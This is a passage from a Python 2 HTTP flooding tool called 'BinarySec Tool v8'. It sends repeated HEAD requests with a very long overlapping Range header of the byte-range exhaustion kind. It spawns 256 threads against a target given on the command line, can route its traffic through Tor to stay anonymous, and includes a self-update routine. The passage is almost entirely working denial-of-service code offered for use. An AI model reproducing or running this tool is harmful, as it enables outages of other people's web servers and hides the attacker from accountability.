21,1-822,1-823,1-824,1-825,1-826,1-827,1-828,1-829,1-830,1-831,1-832,1-833,1-834,1-835,1-836,1-837,1-838,1-839,1-840,1-841,1-842,1-843,1-844,1-845,1-846,1-847,1-848,1-849,1-850,1-851,1-852,1-853,1-854,1-855,1-856,1-857,1-858,1-859,1-860,1-861,1-862,1-863,1-864,1-865,1-866,1-867,1-868,1-869,1-870,1-871,1-872,1-873,1-874,1-875,1-876,1-877,1-878,1-879,1-880,1-881,1-882,1-883,1-884,1-885,1-886,1-887,1-888,1-889,1-890,1-891,1-892,1-893,1-894,1-895,1-896,1-897,1-898,1-899,1-900,1-901,1-902,1-903,1-904,1-905,1-906,1-907,1-908,1-909,1-910,1-911,1-912,1-913,1-914,1-915,1-916,1-917,1-918,1-919,1-920,1-921,1-922,1-923,1-924,1-925,1-926,1-927,1-928,1-929,1-930,1-931,1-932,1-933,1-934,1-935,1-936,1-937,1-938,1-939,1-940,1-941,1-942,1-943,1-944,1-945,1-946,1-947,1-948,1-949,1-950,1-951,1-952,1-953,1-954,1-955,1-956,1-957,1-958,1-959,1-960,1-961,1-962,1-963,1-964,1-965,1-966,1-967,1-968,1-969,1-970,1-971,1-972,1-973,1-974,1-975,1-976,1-977,1-978,1-979,1-980,1-981,1-982,1-983,1-984,1-985,1-986,1-987,1-988,1-989,1-990,1-991,1-992,1-993,1-994,1-995,1-996,1-997,1-998,1-999,1-1000,1-1001,1-1002,1-1003,1-1004,1-1005,1-1006,1-1007,1-1008,1-1009,1-1010,1-1011,1-1012,1-1013,1-1014,1-1015,1-1016,1-1017,1-1018,1-1019,1-1020,1-1021,1-1022,1-1023,1-1024,1-1025,1-1026,1-1027,1-1028,1-1029,1-1030,1-1031,1-1032,1-1033,1-1034,1-1035,1-1036,1-1037,1-1038,1-1039,1-1040,1-1041,1-1042,1-1043,1-1044,1-1045,1-1046,1-1047,1-1048,1-1049,1-1050,1-1051,1-1052,1-1053,1-1054,1-1055,1-1056,1-1057,1-1058,1-1059,1-1060,1-1061,1-1062,1-1063,1-1064,1-1065,1-1066,1-1067,1-1068,1-1069,1-1070,1-1071,1-1072,1-1073,1-1074,1-1075,1-1076,1-1077,1-1078,1-1079,1-1080,1-1081,1-1082,1-1083,1-1084,1-1085,1-1086,1-1087,1-1088,1-1089,1-1090,1-1091,1-1092,1-1093,1-1094,1-1095,1-1096,1-1097,1-1098,1-1099,1-1100,1-1101,1-1102,1-1103,1-1104,1-1105,1-1106,1-1107,1-1108,1-1109,1-1110,1-1111,1-1112,1-1113,1-1114,1-1115,1-1116,1-1117,1-1118,1-1119,1-1120,1-1121,1-1122,1-1123,1-1124,1-1125,1-1126,1-1127,1-1128,1-1129,1-1130,1-1131,1-1132,1-1133,1-1134,1-1135,1-1136,1-1137,1-1138,1-1139,1-1140,1-1141,1-1142,1-1143,1-1144,1-1145,1-1146,1-1147,1-1148,1-1149,1-1150,1-1151,1-1152,1-1153,1-1154,1-1155,1-1156,1-1157,1-1158,1-1159,1-1160,1-1161,1-1162,1-1163,1-1164,1-1165,1-1166,1-1167,1-1168,1-1169,1-1170,1-1171,1-1172,1-1173,1-1174,1-1175,1-1176,1-1177,1-1178,1-1179,1-1180,1-1181,1-1182,1-1183,1-1184,1-1185,1-1186,1-1187,1-1188,1-1189,1-1190,1-1191,1-1192,1-1193,1-1194,1-1195,1-1196,1-1197,1-1198,1-1199,1-1200,1-1201,1-1202,1-1203,1-1204,1-1205,1-1206,1-1207,1-1208,1-1209,1-1210,1-1211,1-1212,1-1213,1-1214,1-1215,1-1216,1-1217,1-1218,1-1219,1-1220,1-1221,1-1222,1-1223,1-1224,1-1225,1-1226,1-1227,1-1228,1-1229,1-1230,1-1231,1-1232,1-1233,1-1234,1-1235,1-1236,1-1237,1-1238,1-1239,1-1240,1-1241,1-1242,1-1243,1-1244,1-1245,1-1246,1-1247,1-1248,1-1249,1-1250,1-1251,1-1252,1-1253,1-1254,1-1255,1-1256,1-1257,1-1258,1-1259,1-1260,1-1261,1-1262,1-1263,1-1264,1-1265,1-1266,1-1267,1-1268,1-1269,1-1270,1-1271,1-1272,1-1273,1-1274,1-1275,1-1276,1-1277,1-1278,1-1279,1-1280,1-1281,1-1282,1-1283,1-1284,1-1285,1-1286,1-1287,1-1288,1-1289,1-1290,1-1291,1-1292,1-1293,1-1294,1-1295,1-1296,1-1297,1-1298,1-1299\r\n" 
			    "Accept-Encoding: gzip,deflate,compress\r\n\r\n" % 
			    (random.choice(getss), self.host, random.choice(useragents)))

            self.socks.send("HEAD /%r HTTP/1.1\r\n" 
			    "Host: %s\r\n"
			    "User-Agent: %s\r\n" "Referer: curl/7.30.0\r\n"
			    "Cache-Control: no-cache, max-age=0\r\n"
			    "Connection: keep-alive\r\n"  
			    "Keep-Alive: 120\r\n" 
			    "Transfer-Encoding: chunked\r\n" 
			    "Accept-Ranges: bytes\r\n" 
			    "Range: bytes= 0-,1-0,1-1,1-2,1-3,1-4,1-5,1-6,1-7,1-8,1-9,1-10,1-11,1-12,1-13,1-14,1-15,1-16,1-17,1-18,1-19,1-20,1-21,1-22,1-23,1-24,1-25,1-26,1-27,1-28,1-29,1-30,1-31,1-32,1-33,1-34,1-35,1-36,1-37,1-38,1-39,1-40,1-41,1-42,1-43,1-44,1-45,1-46,1-47,1-48,1-49,1-50,1-51,1-52,1-53,1-54,1-55,1-56,1-57,1-58,1-59,1-60,1-61,1-62,1-63,1-64,1-65,1-66,1-67,1-68,1-69,1-70,1-71,1-72,1-73,1-74,1-75,1-76,1-77,1-78,1-79,1-80,1-81,1-82,1-83,1-84,1-85,1-86,1-87,1-88,1-89,1-90,1-91,1-92,1-93,1-94,1-95,1-96,1-97,1-98,1-99,1-100,1-101,1-102,1-103,1-104,1-105,1-106,1-107,1-108,1-109,1-110,1-111,1-112,1-113,1-114,1-115,1-116,1-117,1-118,1-119,1-120,1-121,1-122,1-123,1-124,1-125,1-126,1-127,1-128,1-129,1-130,1-131,1-132,1-133,1-134,1-135,1-136,1-137,1-138,1-139,1-140,1-141,1-142,1-143,1-144,1-145,1-146,1-147,1-148,1-149,1-150,1-151,1-152,1-153,1-154,1-155,1-156,1-157,1-158,1-159,1-160,1-161,1-162,1-163,1-164,1-165,1-166,1-167,1-168,1-169,1-170,1-171,1-172,1-173,1-174,1-175,1-176,1-177,1-178,1-179,1-180,1-181,1-182,1-183,1-184,1-185,1-186,1-187,1-188,1-189,1-190,1-191,1-192,1-193,1-194,1-195,1-196,1-197,1-198,1-199,1-200,1-201,1-202,1-203,1-204,1-205,1-206,1-207,1-208,1-209,1-210,1-211,1-212,1-213,1-214,1-215,1-216,1-217,1-218,1-219,1-220,1-221,1-222,1-223,1-224,1-225,1-226,1-227,1-228,1-229,1-230,1-231,1-232,1-233,1-234,1-235,1-236,1-237,1-238,1-239,1-240,1-241,1-242,1-243,1-244,1-245,1-246,1-247,1-248,1-249,1-250,1-251,1-252,1-253,1-254,1-255,1-256,1-257,1-258,1-259,1-260,1-261,1-262,1-263,1-264,1-265,1-266,1-267,1-268,1-269,1-270,1-271,1-272,1-273,1-274,1-275,1-276,1-277,1-278,1-279,1-280,1-281,1-282,1-283,1-284,1-285,1-286,1-287,1-288,1-289,1-290,1-291,1-292,1-293,1-294,1-295,1-296,1-297,1-298,1-299,1-300,1-301,1-302,1-303,1-304,1-305,1-306,1-307,1-308,1-309,1-310,1-311,1-312,1-313,1-314,1-315,1-316,1-317,1-318,1-319,1-320,1-321,1-322,1-323,1-324,1-325,1-326,1-327,1-328,1-329,1-330,1-331,1-332,1-333,1-334,1-335,1-336,1-337,1-338,1-339,1-340,1-341,1-342,1-343,1-344,1-345,1-346,1-347,1-348,1-349,1-350,1-351,1-352,1-353,1-354,1-355,1-356,1-357,1-358,1-359,1-360,1-361,1-362,1-363,1-364,1-365,1-366,1-367,1-368,1-369,1-370,1-371,1-372,1-373,1-374,1-375,1-376,1-377,1-378,1-379,1-380,1-381,1-382,1-383,1-384,1-385,1-386,1-387,1-388,1-389,1-390,1-391,1-392,1-393,1-394,1-395,1-396,1-397,1-398,1-399,1-400,1-401,1-402,1-403,1-404,1-405,1-406,1-407,1-408,1-409,1-410,1-411,1-412,1-413,1-414,1-415,1-416,1-417,1-418,1-419,1-420,1-421,1-422,1-423,1-424,1-425,1-426,1-427,1-428,1-429,1-430,1-431,1-432,1-433,1-434,1-435,1-436,1-437,1-438,1-439,1-440,1-441,1-442,1-443,1-444,1-445,1-446,1-447,1-448,1-449,1-450,1-451,1-452,1-453,1-454,1-455,1-456,1-457,1-458,1-459,1-460,1-461,1-462,1-463,1-464,1-465,1-466,1-467,1-468,1-469,1-470,1-471,1-472,1-473,1-474,1-475,1-476,1-477,1-478,1-479,1-480,1-481,1-482,1-483,1-484,1-485,1-486,1-487,1-488,1-489,1-490,1-491,1-492,1-493,1-494,1-495,1-496,1-497,1-498,1-499,1-500,1-501,1-502,1-503,1-504,1-505,1-506,1-507,1-508,1-509,1-510,1-511,1-512,1-513,1-514,1-515,1-516,1-517,1-518,1-519,1-520,1-521,1-522,1-523,1-524,1-525,1-526,1-527,1-528,1-529,1-530,1-531,1-532,1-533,1-534,1-535,1-536,1-537,1-538,1-539,1-540,1-541,1-542,1-543,1-544,1-545,1-546,1-547,1-548,1-549,1-550,1-551,1-552,1-553,1-554,1-555,1-556,1-557,1-558,1-559,1-560,1-561,1-562,1-563,1-564,1-565,1-566,1-567,1-568,1-569,1-570,1-571,1-572,1-573,1-574,1-575,1-576,1-577,1-578,1-579,1-580,1-581,1-582,1-583,1-584,1-585,1-586,1-587,1-588,1-589,1-590,1-591,1-592,1-593,1-594,1-595,1-596,1-597,1-598,1-599,1-600,1-601,1-602,1-603,1-604,1-605,1-606,1-607,1-608,1-609,1-610,1-611,1-612,1-613,1-614,1-615,1-616,1-617,1-618,1-619,1-620,1-621,1-622,1-623,1-624,1-625,1-626,1-627,1-628,1-629,1-630,1-631,1-632,1-633,1-634,1-635,1-636,1-637,1-638,1-639,1-640,1-641,1-642,1-643,1-644,1-645,1-646,1-647,1-648,1-649,1-650,1-651,1-652,1-653,1-654,1-655,1-656,1-657,1-658,1-659,1-660,1-661,1-662,1-663,1-664,1-665,1-666,1-667,1-668,1-669,1-670,1-671,1-672,1-673,1-674,1-675,1-676,1-677,1-678,1-679,1-680,1-681,1-682,1-683,1-684,1-685,1-686,1-687,1-688,1-689,1-690,1-691,1-692,1-693,1-694,1-695,1-696,1-697,1-698,1-699,1-700,1-701,1-702,1-703,1-704,1-705,1-706,1-707,1-708,1-709,1-710,1-711,1-712,1-713,1-714,1-715,1-716,1-717,1-718,1-719,1-720,1-721,1-722,1-723,1-724,1-725,1-726,1-727,1-728,1-729,1-730,1-731,1-732,1-733,1-734,1-735,1-736,1-737,1-738,1-739,1-740,1-741,1-742,1-743,1-744,1-745,1-746,1-747,1-748,1-749,1-750,1-751,1-752,1-753,1-754,1-755,1-756,1-757,1-758,1-759,1-760,1-761,1-762,1-763,1-764,1-765,1-766,1-767,1-768,1-769,1-770,1-771,1-772,1-773,1-774,1-775,1-776,1-777,1-778,1-779,1-780,1-781,1-782,1-783,1-784,1-785,1-786,1-787,1-788,1-789,1-790,1-791,1-792,1-793,1-794,1-795,1-796,1-797,1-798,1-799,1-800,1-801,1-802,1-803,1-804,1-805,1-806,1-807,1-808,1-809,1-810,1-811,1-812,1-813,1-814,1-815,1-816,1-817,1-818,1-819,1-820,1-821,1-822,1-823,1-824,1-825,1-826,1-827,1-828,1-829,1-830,1-831,1-832,1-833,1-834,1-835,1-836,1-837,1-838,1-839,1-840,1-841,1-842,1-843,1-844,1-845,1-846,1-847,1-848,1-849,1-850,1-851,1-852,1-853,1-854,1-855,1-856,1-857,1-858,1-859,1-860,1-861,1-862,1-863,1-864,1-865,1-866,1-867,1-868,1-869,1-870,1-871,1-872,1-873,1-874,1-875,1-876,1-877,1-878,1-879,1-880,1-881,1-882,1-883,1-884,1-885,1-886,1-887,1-888,1-889,1-890,1-891,1-892,1-893,1-894,1-895,1-896,1-897,1-898,1-899,1-900,1-901,1-902,1-903,1-904,1-905,1-906,1-907,1-908,1-909,1-910,1-911,1-912,1-913,1-914,1-915,1-916,1-917,1-918,1-919,1-920,1-921,1-922,1-923,1-924,1-925,1-926,1-927,1-928,1-929,1-930,1-931,1-932,1-933,1-934,1-935,1-936,1-937,1-938,1-939,1-940,1-941,1-942,1-943,1-944,1-945,1-946,1-947,1-948,1-949,1-950,1-951,1-952,1-953,1-954,1-955,1-956,1-957,1-958,1-959,1-960,1-961,1-962,1-963,1-964,1-965,1-966,1-967,1-968,1-969,1-970,1-971,1-972,1-973,1-974,1-975,1-976,1-977,1-978,1-979,1-980,1-981,1-982,1-983,1-984,1-985,1-986,1-987,1-988,1-989,1-990,1-991,1-992,1-993,1-994,1-995,1-996,1-997,1-998,1-999,1-1000,1-1001,1-1002,1-1003,1-1004,1-1005,1-1006,1-1007,1-1008,1-1009,1-1010,1-1011,1-1012,1-1013,1-1014,1-1015,1-1016,1-1017,1-1018,1-1019,1-1020,1-1021,1-1022,1-1023,1-1024,1-1025,1-1026,1-1027,1-1028,1-1029,1-1030,1-1031,1-1032,1-1033,1-1034,1-1035,1-1036,1-1037,1-1038,1-1039,1-1040,1-1041,1-1042,1-1043,1-1044,1-1045,1-1046,1-1047,1-1048,1-1049,1-1050,1-1051,1-1052,1-1053,1-1054,1-1055,1-1056,1-1057,1-1058,1-1059,1-1060,1-1061,1-1062,1-1063,1-1064,1-1065,1-1066,1-1067,1-1068,1-1069,1-1070,1-1071,1-1072,1-1073,1-1074,1-1075,1-1076,1-1077,1-1078,1-1079,1-1080,1-1081,1-1082,1-1083,1-1084,1-1085,1-1086,1-1087,1-1088,1-1089,1-1090,1-1091,1-1092,1-1093,1-1094,1-1095,1-1096,1-1097,1-1098,1-1099,1-1100,1-1101,1-1102,1-1103,1-1104,1-1105,1-1106,1-1107,1-1108,1-1109,1-1110,1-1111,1-1112,1-1113,1-1114,1-1115,1-1116,1-1117,1-1118,1-1119,1-1120,1-1121,1-1122,1-1123,1-1124,1-1125,1-1126,1-1127,1-1128,1-1129,1-1130,1-1131,1-1132,1-1133,1-1134,1-1135,1-1136,1-1137,1-1138,1-1139,1-1140,1-1141,1-1142,1-1143,1-1144,1-1145,1-1146,1-1147,1-1148,1-1149,1-1150,1-1151,1-1152,1-1153,1-1154,1-1155,1-1156,1-1157,1-1158,1-1159,1-1160,1-1161,1-1162,1-1163,1-1164,1-1165,1-1166,1-1167,1-1168,1-1169,1-1170,1-1171,1-1172,1-1173,1-1174,1-1175,1-1176,1-1177,1-1178,1-1179,1-1180,1-1181,1-1182,1-1183,1-1184,1-1185,1-1186,1-1187,1-1188,1-1189,1-1190,1-1191,1-1192,1-1193,1-1194,1-1195,1-1196,1-1197,1-1198,1-1199,1-1200,1-1201,1-1202,1-1203,1-1204,1-1205,1-1206,1-1207,1-1208,1-1209,1-1210,1-1211,1-1212,1-1213,1-1214,1-1215,1-1216,1-1217,1-1218,1-1219,1-1220,1-1221,1-1222,1-1223,1-1224,1-1225,1-1226,1-1227,1-1228,1-1229,1-1230,1-1231,1-1232,1-1233,1-1234,1-1235,1-1236,1-1237,1-1238,1-1239,1-1240,1-1241,1-1242,1-1243,1-1244,1-1245,1-1246,1-1247,1-1248,1-1249,1-1250,1-1251,1-1252,1-1253,1-1254,1-1255,1-1256,1-1257,1-1258,1-1259,1-1260,1-1261,1-1262,1-1263,1-1264,1-1265,1-1266,1-1267,1-1268,1-1269,1-1270,1-1271,1-1272,1-1273,1-1274,1-1275,1-1276,1-1277,1-1278,1-1279,1-1280,1-1281,1-1282,1-1283,1-1284,1-1285,1-1286,1-1287,1-1288,1-1289,1-1290,1-1291,1-1292,1-1293,1-1294,1-1295,1-1296,1-1297,1-1298,1-1299\r\n" 
			    "Accept-Encoding: gzip,deflate,compress\r\n\r\n" % 
			    (random.choice(getss), self.host, random.choice(useragents)))
	    time.sleep(random.uniform(0.1, 3))

        self.socks.close()

    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:     
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                    self.socks.connect((self.host, self.port))
                    print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
                    time.sleep(1)
                    continue
	
            while self.running:
                try:
                    self._send_http_post()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
                        self.socks = socks.socksocket()
                        ssl.wrap_socket(self.socks, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="ADH-AES256-SHA")
                        break
                    time.sleep(0.1)
                    pass
def usage():
        print "./BinarySecv8Term.py -t <target> [-r <threads> -p <port> -T -h]"
        print " -t|--target <Hostname|IP>"
        print " -r|--threads <Number of threads> Defaults to 256"
        print " -p|--port <Web Server Port> Defaults to 80"
        print " -T|--tor Enable anonymising through tor on 127.0.0.1:9050"
        print " -h|--help Shows this help\n"
        print "Eg. ./BinarySecv8Term.py -t 192.168.1.100 -r 256\n"

def main(argv):

        try:
                opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
        except getopt.GetoptError:
                usage() 
                sys.exit(-1)

        global stop_now

        target = ''
        threads = 256
        tor = False
        port = 80

        for o, a in opts:
                if o in ("-h", "--help"):
                        usage()
                        sys.exit(0)
                if o in ("-T", "--tor"):
                        tor = True
                elif o in ("-t", "--target"):
                        target = a
                elif o in ("-r", "--threads"):
                        threads = int(a)
                elif o in ("-p", "--port"):
                        port = int(a)
         
        if target == '' or int(threads) <= 0:
                usage()
                sys.exit(-1)

        print term.DOWN + term.RED + "/*" + term.NORMAL
        print term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL
        print term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL

        rthreads = []
        for i in range(threads):
                t = httpPost(target, port, tor)
                rthreads.append(t)
                t.start()

        while len(rthreads) > 0:
                try:
                        rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
                except KeyboardInterrupt:
                        print "\nShutting down threads...\n"
                        for t in rthreads:
                                stop_now = True
                                t.running = False

if __name__ == "__main__":
        if update == True:
           print "Update Available"
           print "Updating Now.."
           updateMainFile()
        else:

           print "\n/*"
           print " *"+term.RED + " BinarySec Tool v8 BCDL 5.0 (Ultimate) +SSL+"+term.NORMAL
           print " * This Flood was developed after 50+ hours of work."
           print " * Made By The Riddler"

           main(sys.argv[1:])

